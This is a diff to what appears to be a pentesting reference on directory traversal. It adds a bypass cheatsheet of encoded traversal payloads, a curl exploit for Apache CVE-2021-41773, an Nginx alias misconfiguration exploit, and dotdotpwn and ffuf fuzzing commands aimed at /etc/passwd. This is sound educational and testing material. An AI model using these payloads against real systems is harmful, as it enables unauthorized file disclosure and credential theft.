@@ -361,3 +361,73 @@ windows_files = ["windows/win.ini", "inetpub/wwwroot/web.config"]
 - Directory Traversal -> **Config Files** -> Database Access
 - Directory Traversal -> **Log Poisoning** -> Remote Code Execution
 - Directory Traversal -> **Source Code** -> Additional Vulnerabilities
+
+---
+
+## Modern Bypass Cheatsheet
+
+```text
+# Non-recursive ../ stripping (filter removes "../" once, not recursively)
+....//....//....//etc/passwd
+..././..././..././etc/passwd
+....\/....\/etc/passwd
+# Absolute-path acceptance (no traversal needed)
+/etc/passwd
+# Required-prefix bypass (app prepends a base dir but allows traversal out)
+/var/www/images/../../../etc/passwd
+# Required-suffix/extension bypass (app appends ".png") -> null byte (old PHP) or path trunc
+../../../etc/passwd%00.png
+# Web server / proxy specific
+..;/   ..%2f   ..%5c   ..%c0%af   %2e%2e%2f   %252e%252e%252f
+/static/..%2f..%2f..%2fetc/passwd        (Nginx alias misconfig: location /static {alias ...})
+# Apache 2.4.49/2.4.50 path traversal (CVE-2021-41773 / 41774)
+curl --path-as-is "http://T/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+# Spring / Tomcat / IIS quirks
+..%c0%af   %c0%ae%c0%ae/   ..%255c   /..\..\
+```
+
+### Nginx off-by-slash (alias misconfiguration)
+
+```nginx
+# Vulnerable config (note missing trailing slash on location)
+location /static {
+    alias /var/www/app/static/;
+}
+# Exploit: /static../ resolves to /var/www/app/  -> traverse up
+curl --path-as-is "http://TARGET/static../app/config.py"
+```
+
+---
+
+## Read vs. Path Traversal vs. LFI
+
+- **Path traversal** = read arbitrary files (the app returns file *contents* but doesn't execute).
+- **LFI** = the included file is *executed/interpreted* (PHP `include`) → escalate to RCE via filter chains, log poisoning, etc. (see file-inclusion/local-file-inclusion.md).
+- Always test whether the returned content is parsed/executed — if PHP source comes back as plain text, it's traversal; if it executes, it's LFI.
+
+---
+
+## Tools
+
+| Tool | Use |
+|------|-----|
+| **ffuf / wfuzz** | Parameter + traversal-depth fuzzing |
+| **dotdotpwn** | Dedicated traversal fuzzer (HTTP/FTP/etc.) |
+| **Burp Intruder** | Spray traversal payload list with `--path-as-is` semantics |
+| **nuclei** | `-tags lfi,traversal` templates |
+
+```bash
+dotdotpwn -m http -h TARGET -f /etc/passwd -k "root:" -d 8
+ffuf -u "http://TARGET/?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mr "root:"
+```
+
+---
+
+## References
+
+- PortSwigger — File path traversal: https://portswigger.net/web-security/file-path-traversal
+- PayloadsAllTheThings — Directory Traversal: https://swisskyrepo.github.io/PayloadsAllTheThings/Directory%20Traversal/
+- HackTricks — File inclusion / path traversal: https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html
+- OWASP — Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal
+- Apache CVE-2021-41773 advisory: https://httpd.apache.org/security/vulnerabilities_24.html
+- dotdotpwn: https://github.com/wireghoul/dotdotpwn
